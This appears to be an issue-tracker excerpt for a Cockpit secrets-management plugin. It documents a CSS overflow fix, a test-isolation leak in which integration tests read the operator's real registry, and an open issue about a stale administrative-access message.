### I59 · A visually-hidden span escaped its scroller and scrolled the whole page sideways · Sev L · FIXED 2026-09-06 (0.5.1)
Pre-existing, in no brief, and invisible to every check §11.5 makes. At a 380px frame the
**entries** view scrolled the PAGE sideways: `documentElement.scrollWidth` 450 vs `clientWidth`
380, and `window.scrollTo(2000, 0)` really moved it 70px. No element was outside its own
scroller.

`.sec-visually-hidden` is `position: absolute`; the entries table puts one inside every boolean
cell (the word "TOTP" beside the tick); **nothing between that cell and the document was
positioned**, so those spans' containing block was the INITIAL containing block, `.sec-scroll`
never clipped them, and `clip: rect(0 0 0 0)` does not remove an element from the root's
scrollable overflow.

**FIXED** with one declaration — `.sec-scroll { position: relative }` — which makes the
scroller the containing block. Measured at 380px: 698/380 with `scrollX` 318 → 380/380 with
`scrollX` 0.

**Regression:** `live-ui.spec.js` item 10 asserts the page did not move by **asking it to
scroll and reading how far it went**, at every one of four widths — comparing `scrollWidth`
alone is what missed this for a whole release. **Watched failing:** with the declaration
removed, the 360px line goes red.

### I60 · `tests/integration/` read the caller's real per-user registry · Sev M · FIXED 2026-09-06 (0.5.1)
`_env.py` built a hermetic registry and exported `COCKPIT_SECRETS_ETC` and `COCKPIT_SECRETS_VAR`
— but the helper resolves the **per-user** registry through `user_home()`, whose test seam is a
third variable, `COCKPIT_SECRETS_HOME`, which `_env.py` did not set. So the caller's real
`~/.config/cockpit-secrets/safes.d` was read straight into the "hermetic" environment.

It was invisible until the operator registered a real safe of their own on 2026-09-05, and then
**eight of `run_tests.sh`'s twenty stages aborted at build time**, before a single test body
ran: `hermetic registry did not load: entries=10 errors=[]`. A whole test suite that stops
running because of an unrelated fact about the machine is the failure mode this is Medium for —
the tenth entry was the operator's own safe, and a green-looking `--quick` run would have hidden
it.

**FIXED** by exporting `COCKPIT_SECRETS_HOME = self.root` beside the two it already set. And
`assert_loaded` was strengthened from a COUNT to an identity check: it runs `list` and refuses
any id that is not in `registered_ids()`, read off the files in `safes.d` so
`corpus_vs_helper.py` rewriting the registry per case still works. The check is deliberately
**one-directional** — no id may be LOADED that was not WRITTEN — because tests write entries in
order to watch them be dropped, and an equality would fail those for succeeding.

**Regression:** the assertion itself. **Watched failing:** an `Env` was constructed with only
the `COCKPIT_SECRETS_HOME` export removed, and `assert_loaded(len(SAFES)+1)` called so the COUNT
agreed and only the new assertion could catch it → `the hermetic registry is NOT hermetic:
['pwsafe3'] came from outside …/etc/safes.d`. **Evidence of closure:** `./run_tests.sh` with no
environment override — **20/20, exit 0** (was 12/20).

---

## Found in 0.5.1, still open

### I61 · An escalated session is still told to turn on administrative access · Sev L · OPEN
Seen in `tests/browser/artifacts/11-safes-path-off-dark.png`, taken by
`live-ui.spec.js` item 11 in a session whose Cockpit header reads **Administrative access** (on)
and where `cockpit.permission({admin:true}).allowed === true`. The details pane for
`dummy-fake-safe` nevertheless reads:

> this safe is administrator-class; turn on Cockpit's Administrative access and try again

The sentence is the helper's own and it is **correct for the caller it was answering**:
`secrets.js` spawns `list` with no superuser option, always (see I56 and
`docs/RESIDUAL-RISK.md` §5.6), so `gate()` sees a non-root euid and returns exactly that. What is
wrong is the PAGE re-showing it after the operator has already done the thing it asks for. The
control is not broken — `live-access.spec.js` item 9 opens that same safe in that same state,
22/22 — so this is advice that has gone stale, not a refusal.

**Not fixed here** because the fix is a judgement about which of two facts the pane should trust
(`list`'s per-row `reason`, or `cockpit.permission`'s live answer) and it belongs with whoever
owns `secrets.js`'s pane. The honest shape is probably: suppress a `reason` whose remedy the
session has already performed, and re-probe instead. **No regression test exists**; the
screenshot is the evidence.
